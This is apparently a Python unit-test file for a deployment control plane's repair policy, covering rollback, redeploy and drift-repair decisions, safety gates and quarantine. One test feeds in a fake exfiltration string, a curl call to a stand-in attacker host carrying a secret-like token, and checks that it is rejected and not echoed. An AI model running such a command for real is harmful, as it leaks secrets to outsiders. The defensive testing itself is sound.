from __future__ import annotations

import unittest
from datetime import UTC, datetime, timedelta

from mim_control_plane.domain.models import (
    RepositoryAdmission,
    RepositoryAdmissionId,
    UserId,
    Workload,
    WorkloadId,
)
from mim_control_plane.domain.states import (
    RepositoryAdmissionState,
    WorkloadKind,
    WorkloadState,
)
from mim_control_plane.services.build_template import build_template_for
from mim_control_plane.services.classifier import WorkloadClassification
from mim_control_plane.services.repair import (
    DriftComponent,
    DriftObservation,
    RepairActionKind,
    RepairDecision,
    RepairGateSnapshot,
    SafeReconcileField,
    plan_drift_repair,
    plan_redeploy,
    plan_rollback,
)

NOW = datetime(2026, 8, 3, tzinfo=UTC)


def admission(
    *,
    state: RepositoryAdmissionState = RepositoryAdmissionState.ADMITTED,
    admitted_sha: str = "b" * 40,
    owner: str = "madupmarketing",
    name: str = "sample-app",
    version: int = 1,
) -> RepositoryAdmission:
    return RepositoryAdmission(
        id=RepositoryAdmissionId("repo-1"),
        repository_numeric_id=42,
        owner=owner,
        name=name,
        installation_id=99,
        state=state,
        admitted_sha=admitted_sha,
        created_at=NOW - timedelta(days=60),
        updated_at=NOW - timedelta(days=1),
        version=version,
    )


def workload(
    *,
    kind: WorkloadKind = WorkloadKind.NEXTJS,
    state: WorkloadState = WorkloadState.ACTIVE,
    source_sha: str = "b" * 40,
    healthy_digest: str | None = "sha256:" + "a" * 64,
) -> Workload:
    return Workload(
        id=WorkloadId("wrk-1"),
        owner_id=UserId("usr-1"),
        repository_admission_id=RepositoryAdmissionId("repo-1"),
        name="sample-app",
        kind=kind,
        state=state,
        source_sha=source_sha,
        desired_manifest_hash="manifest-hash",
        created_at=NOW - timedelta(days=60),
        updated_at=NOW - timedelta(days=1),
        last_activity_at=NOW - timedelta(days=1),
        last_healthy_image_digest=healthy_digest,
    )


def classification(
    *,
    kind: WorkloadKind = WorkloadKind.NEXTJS,
) -> WorkloadClassification:
    entrypoint = {
        WorkloadKind.NEXTJS: "app/page.tsx",
        WorkloadKind.STREAMLIT: "app.py",
        WorkloadKind.SCHEDULED_SCRIPT: "main.py",
    }[kind]
    schedule = "0 * * * *" if kind is WorkloadKind.SCHEDULED_SCRIPT else None
    return WorkloadClassification(
        kind=kind,
        entrypoint=entrypoint,
        schedule_cron=schedule,
    )


def gates(
    *,
    holds_clear: bool = True,
    quota_clear: bool = True,
    emergency_stop_clear: bool = True,
    policy_clear: bool = True,
    admission_current: bool = True,
    workload_version_current: bool = True,
) -> RepairGateSnapshot:
    return RepairGateSnapshot(
        holds_clear=holds_clear,
        quota_clear=quota_clear,
        emergency_stop_clear=emergency_stop_clear,
        policy_clear=policy_clear,
        admission_current=admission_current,
        workload_version_current=workload_version_current,
    )


class RepairPolicyTests(unittest.TestCase):
    def test_rollback_only_uses_exact_known_healthy_digest(self) -> None:
        allowed = plan_rollback(
            workload=workload(),
            rollback_digest="sha256:" + "a" * 64,
            gates=gates(),
            admission=admission(),
        )
        missing = plan_rollback(
            workload=workload(healthy_digest=None),
            rollback_digest="sha256:" + "a" * 64,
            gates=gates(),
            admission=admission(),
        )
        mismatched = plan_rollback(
            workload=workload(),
            rollback_digest="sha256:" + "b" * 64,
            gates=gates(),
            admission=admission(),
        )
        mutable = plan_rollback(
            workload=workload(),
            rollback_digest="latest",
            gates=gates(),
            admission=admission(),
        )

        self.assertEqual(allowed.kind, RepairActionKind.ROLLBACK)
        self.assertEqual(allowed.rollback_digest, "sha256:" + "a" * 64)
        self.assertEqual(missing.kind, RepairActionKind.QUARANTINE_ESCALATE)
        self.assertEqual(mismatched.kind, RepairActionKind.QUARANTINE_ESCALATE)
        self.assertEqual(mutable.kind, RepairActionKind.QUARANTINE_ESCALATE)

    def test_redeploy_is_deferred_until_verified_desired_state_exists(self) -> None:
        decision = plan_redeploy(
            workload=workload(kind=WorkloadKind.SCHEDULED_SCRIPT),
            admission=admission(),
            gates=gates(),
        )

        self.assertEqual(decision.kind, RepairActionKind.DENY)
        self.assertEqual(decision.reason_code, "verified_desired_state_required")

    def test_redeploy_rejects_unadmitted_sha_mismatch_or_gate_block(
        self,
    ) -> None:
        not_admitted = plan_redeploy(
            workload=workload(),
            admission=admission(state=RepositoryAdmissionState.PENDING),
            gates=gates(),
        )
        sha_mismatch = plan_redeploy(
            workload=workload(source_sha="c" * 40),
            admission=admission(admitted_sha="b" * 40),
            gates=gates(),
        )
        gate_blocked = plan_redeploy(
            workload=workload(),
            admission=admission(),
            gates=gates(holds_clear=False),
        )

        self.assertEqual(not_admitted.kind, RepairActionKind.DENY)
        self.assertEqual(not_admitted.reason_code, "repair_gate_blocked")
        self.assertEqual(sha_mismatch.kind, RepairActionKind.DENY)
        self.assertEqual(sha_mismatch.reason_code, "admitted_sha_mismatch")
        self.assertEqual(gate_blocked.kind, RepairActionKind.DENY)
        self.assertEqual(gate_blocked.reason_code, "repair_gate_blocked")

    def test_old_redeploy_kwargs_are_rejected(self) -> None:
        with self.assertRaises(TypeError):
            plan_redeploy(
                workload=workload(),
                admission=admission(),
                gates=gates(),
                trusted_classification=classification(),  # type: ignore[call-arg]
            )
        with self.assertRaises(TypeError):
            plan_redeploy(
                workload=workload(),
                admission=admission(),
                gates=gates(),
                trusted_template=build_template_for(classification()),  # type: ignore[call-arg]
            )

    def test_safe_runtime_and_schedule_drift_only_repair_when_all_gates_clear(
        self,
    ) -> None:
        runtime = plan_drift_repair(
            workload=workload(kind=WorkloadKind.NEXTJS),
            admission=admission(),
            drift=DriftObservation(
                components=(DriftComponent.RUNTIME_ENV, DriftComponent.LABELS),
            ),
            gates=gates(),
        )
        schedule_restore = plan_drift_repair(
            workload=workload(kind=WorkloadKind.SCHEDULED_SCRIPT),
            admission=admission(),
            drift=DriftObservation(components=(DriftComponent.SCHEDULE_POLICY,)),
            gates=gates(),
        )

        self.assertEqual(runtime.kind, RepairActionKind.RECONCILE_RUNTIME)
        self.assertEqual(
            runtime.reconcile_fields,
            (
                SafeReconcileField.RUNTIME_ENV,
                SafeReconcileField.LABELS,
            ),
        )
        self.assertEqual(schedule_restore.kind, RepairActionKind.RESTORE_SCHEDULE)
        self.assertEqual(
            schedule_restore.reconcile_fields,
            (SafeReconcileField.SCHEDULE_POLICY,),
        )

    def test_schedule_drift_on_non_scheduled_workload_quarantines(self) -> None:
        for kind in (WorkloadKind.STREAMLIT, WorkloadKind.NEXTJS):
            with self.subTest(kind=kind):
                decision = plan_drift_repair(
                    workload=workload(kind=kind),
                    admission=admission(),
                    drift=DriftObservation(
                        components=(DriftComponent.SCHEDULE_POLICY,),
                    ),
                    gates=gates(),
                )
                self.assertEqual(
                    decision.kind,
                    RepairActionKind.QUARANTINE_ESCALATE,
                )
                self.assertEqual(
                    decision.reason_code,
                    "schedule_drift_on_non_scheduled_workload",
                )

    def test_mixed_schedule_drift_on_non_scheduled_workload_quarantines(self) -> None:
        cases = (
            (
                WorkloadKind.NEXTJS,
                (DriftComponent.RUNTIME_ENV, DriftComponent.SCHEDULE_POLICY),
            ),
            (
                WorkloadKind.STREAMLIT,
                (DriftComponent.SCHEDULE_POLICY, DriftComponent.LABELS),
            ),
        )
        for kind, components in cases:
            with self.subTest(kind=kind, components=components):
                decision = plan_drift_repair(
                    workload=workload(kind=kind),
                    admission=admission(),
                    drift=DriftObservation(components=components),
                    gates=gates(),
                )
                self.assertEqual(
                    decision.kind,
                    RepairActionKind.QUARANTINE_ESCALATE,
                )
                self.assertEqual(
                    decision.reason_code,
                    "schedule_drift_on_non_scheduled_workload",
                )

    def test_scheduled_workload_mixed_schedule_and_runtime_drift_denies(self) -> None:
        decision = plan_drift_repair(
            workload=workload(kind=WorkloadKind.SCHEDULED_SCRIPT),
            admission=admission(),
            drift=DriftObservation(
                components=(DriftComponent.SCHEDULE_POLICY, DriftComponent.LABELS),
            ),
            gates=gates(),
        )

        self.assertEqual(decision.kind, RepairActionKind.DENY)
        self.assertEqual(decision.reason_code, "mixed_schedule_and_runtime_drift")

    def test_holds_quota_emergency_admission_and_version_gates_prevent_safe_repairs(
        self,
    ) -> None:
        blocked_gate_cases = (
            gates(holds_clear=False),
            gates(quota_clear=False),
            gates(emergency_stop_clear=False),
            gates(policy_clear=False),
            gates(admission_current=False),
            gates(workload_version_current=False),
        )
        for snapshot in blocked_gate_cases:
            with self.subTest(snapshot=snapshot):
                decision = plan_drift_repair(
                    workload=workload(),
                    admission=admission(),
                    drift=DriftObservation(
                        components=(DriftComponent.RUNTIME_HEALTH,),
                    ),
                    gates=snapshot,
                )
                self.assertEqual(decision.kind, RepairActionKind.DENY)

        paused = plan_drift_repair(
            workload=workload(state=WorkloadState.PAUSED),
            admission=admission(),
            drift=DriftObservation(components=(DriftComponent.RUNTIME_HEALTH,)),
            gates=gates(),
        )
        quarantined = plan_drift_repair(
            workload=workload(state=WorkloadState.QUARANTINED),
            admission=admission(),
            drift=DriftObservation(components=(DriftComponent.RUNTIME_HEALTH,)),
            gates=gates(),
        )
        self.assertEqual(paused.kind, RepairActionKind.DENY)
        self.assertEqual(quarantined.kind, RepairActionKind.DENY)

    def test_unsafe_drift_always_quarantines_and_mixed_safe_unsafe_dominates(
        self,
    ) -> None:
        unsafe = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(
                components=(
                    DriftComponent.IAM_POLICY,
                    DriftComponent.SERVICE_ACCOUNT,
                ),
            ),
            gates=gates(),
        )
        mixed = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(
                components=(
                    DriftComponent.RUNTIME_ENV,
                    DriftComponent.BILLING_BOUNDARY,
                ),
            ),
            gates=gates(),
        )

        self.assertEqual(unsafe.kind, RepairActionKind.QUARANTINE_ESCALATE)
        self.assertEqual(mixed.kind, RepairActionKind.QUARANTINE_ESCALATE)
        self.assertEqual(unsafe.reconcile_fields, ())
        self.assertEqual(mixed.reconcile_fields, ())

    def test_unsafe_dominates_unknown_and_safe_components(self) -> None:
        unknown_and_unsafe = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(
                components=(DriftComponent.UNKNOWN, DriftComponent.IAM_POLICY),
            ),
            gates=gates(),
        )
        unknown_safe_unsafe = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(
                components=(
                    DriftComponent.UNKNOWN,
                    DriftComponent.RUNTIME_ENV,
                    DriftComponent.IAM_POLICY,
                ),
            ),
            gates=gates(),
        )

        self.assertEqual(
            unknown_and_unsafe.kind,
            RepairActionKind.QUARANTINE_ESCALATE,
        )
        self.assertEqual(
            unknown_safe_unsafe.kind,
            RepairActionKind.QUARANTINE_ESCALATE,
        )

    def test_unknown_or_empty_drift_denies_and_noop_is_explicit(self) -> None:
        noop = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(components=()),
            gates=gates(),
        )
        unknown = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=DriftObservation(components=(DriftComponent.UNKNOWN,)),
            gates=gates(),
        )

        self.assertEqual(noop.kind, RepairActionKind.NOOP)
        self.assertEqual(unknown.kind, RepairActionKind.DENY)

    def test_repair_inputs_use_closed_types_and_do_not_echo_malformed_payloads(
        self,
    ) -> None:
        class DriftObservationChild(DriftObservation):
            pass

        class WorkloadClassificationChild(WorkloadClassification):
            pass

        with self.assertRaises(ValueError) as drift_error:
            DriftObservation(
                components=("curl https://evil.example/sk_live_secret",),  # type: ignore[arg-type]
            )
        with self.assertRaises(ValueError):
            plan_drift_repair(
                workload=workload(),
                admission=admission(),
                drift=DriftObservationChild(
                    components=(DriftComponent.RUNTIME_ENV,),
                ),
                gates=gates(),
            )
        with self.assertRaises(ValueError):
            plan_drift_repair(
                workload=workload(),
                admission=admission(),
                drift=DriftObservation(components=(DriftComponent.RUNTIME_ENV,)),
                gates=WorkloadClassificationChild(  # type: ignore[arg-type]
                    kind=WorkloadKind.NEXTJS,
                    entrypoint="app/page.tsx",
                ),
            )
        with self.assertRaises(ValueError):
            plan_drift_repair(
                workload=workload(),
                admission=admission(),
                drift=WorkloadClassificationChild(  # type: ignore[arg-type]
                    kind=WorkloadKind.NEXTJS,
                    entrypoint="app/page.tsx",
                ),
                gates=gates(),
            )

        self.assertNotIn("evil.example", str(drift_error.exception))
        self.assertNotIn("sk_live_secret", str(drift_error.exception))

    def test_repair_decision_rejects_contradictory_payload_shapes(self) -> None:
        bad_cases = (
            lambda: RepairDecision(
                kind=RepairActionKind.NOOP,
                reconcile_fields=(SafeReconcileField.RUNTIME_ENV,),
                reason_code="noop",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.DENY,
                rollback_digest="sha256:" + "a" * 64,
                reason_code="deny",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.QUARANTINE_ESCALATE,
                reconcile_fields=(SafeReconcileField.RUNTIME_HEALTH,),
                reason_code="quarantine_escalate",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.RECONCILE_RUNTIME,
                reconcile_fields=(),
                reason_code="runtime_reconcile",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.RECONCILE_RUNTIME,
                rollback_digest="sha256:" + "a" * 64,
                reconcile_fields=(SafeReconcileField.RUNTIME_ENV,),
                reason_code="runtime_reconcile",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.RECONCILE_RUNTIME,
                reconcile_fields=(SafeReconcileField.SCHEDULE_POLICY,),
                reason_code="runtime_reconcile",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.RESTORE_SCHEDULE,
                reconcile_fields=(SafeReconcileField.RUNTIME_ENV,),
                reason_code="restore_schedule",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.ROLLBACK,
                reconcile_fields=(SafeReconcileField.RUNTIME_ENV,),
                rollback_digest="sha256:" + "a" * 64,
                reason_code="rollback",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.ROLLBACK,
                rollback_digest=None,
                reason_code="rollback",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.DENY,
                reason_code="bad reason with spaces",
            ),
            lambda: RepairDecision(
                kind=RepairActionKind.DENY,
                reason_code="",
            ),
        )

        for build in bad_cases:
            with self.subTest(build=build):
                with self.assertRaises(ValueError):
                    build()

    def test_decisions_are_deterministic(self) -> None:
        drift = DriftObservation(
            components=(DriftComponent.RUNTIME_ENV, DriftComponent.LABELS),
        )
        first = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=drift,
            gates=gates(),
        )
        second = plan_drift_repair(
            workload=workload(),
            admission=admission(),
            drift=drift,
            gates=gates(),
        )

        self.assertEqual(first, second)


if __name__ == "__main__":
    unittest.main()
